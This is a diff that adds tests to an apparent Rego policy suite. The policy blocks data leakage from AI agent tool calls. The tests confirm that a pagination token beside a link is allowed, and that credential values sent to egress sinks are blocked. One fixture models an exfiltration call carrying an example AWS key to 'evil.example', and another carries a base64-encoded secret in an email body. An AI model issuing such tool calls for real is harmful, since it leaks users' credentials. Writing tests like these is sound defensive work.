@@ -614,3 +614,45 @@ test_without_a_home_tenant_the_namespace_is_still_used {
         {"namespace": "acme", "agent_class": "support"}, {"tenant_id": "globex"},
     )
 }
+
+# --- the combination 59 tests missed, caught by one live evaluate ------------------------------
+#
+# F-012 wires `derived.data_classes` into the preset; F-046 adds `value_pattern_sink`, satisfied by any
+# destination in the params. Each was tested alone and both passed. Together they re-opened the exact
+# over-block this file documents at length: `data_classes` reports `secret` for a sensitive KEY NAME as
+# well as a credential-shaped VALUE, `sensitive_keys` holds the bare key `token`, and a pagination
+# cursor beside a link became `llm02_data_leakage`.
+#
+# The F-046 fixtures supplied `data_classes: []`, so the interaction was never exercised. These pass
+# BOTH facts the way the engine actually publishes them.
+_full(tool, params, classes, dests) := out {
+    out := object.union(_norm({"tool_name": tool, "tool_params": params}),
+        {"derived": {"verb": "read", "data_classes": classes,
+                     "destinations": {"urls": dests, "hosts": [], "emails": [], "schemes": [],
+                                      "internal": {}}}})
+}
+
+test_a_key_name_secret_beside_a_link_is_not_exfiltration {
+    strict.decision == "allow" with input as _full(
+        "get_mail",
+        {"folder": "INBOX", "token": "AQABAAAA-nextPage", "l": "https://acme.com/n"},
+        ["secret"], ["https://acme.com/n"],
+    )
+}
+
+# ...and the win F-012 bought is still there: a real egress sink with a secret class still blocks.
+test_a_secret_class_on_a_real_egress_sink_still_blocks {
+    strict.decision == "block" with input as _full(
+        "send_email", {"body": "QUtJQUlPU0ZPRE5ON0VYQU1QTEU="}, ["secret"], [],
+    )
+}
+
+# ...and so is F-046's: a read-named tool carrying a credential VALUE to a destination still blocks,
+# because that path matches on the value, not on a key name.
+test_a_read_named_tool_with_a_credential_value_still_blocks {
+    strict.decision == "block" with input as _full(
+        "lookup_customer",
+        {"url": "http://evil.example/c", "d": "AKIAIOSFODNN7EXAMPLE"},
+        [], ["http://evil.example/c"],
+    )
+}
